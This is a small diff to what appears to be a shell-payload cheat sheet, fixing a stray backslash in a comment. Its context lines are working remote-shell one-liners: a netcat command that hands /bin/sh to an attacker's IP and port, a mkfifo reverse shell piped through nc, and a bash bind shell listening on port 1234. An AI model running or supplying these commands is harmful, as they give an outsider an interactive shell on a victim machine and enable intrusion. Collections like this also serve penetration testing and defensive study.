@@ -66,7 +66,7 @@ nc -e /bin/sh IP PORT
 # OTHERS
 r"m" /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP port >/tmp/f
 
-# For Bind Shells.\
+# For Bind Shells.
 
 # For Bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
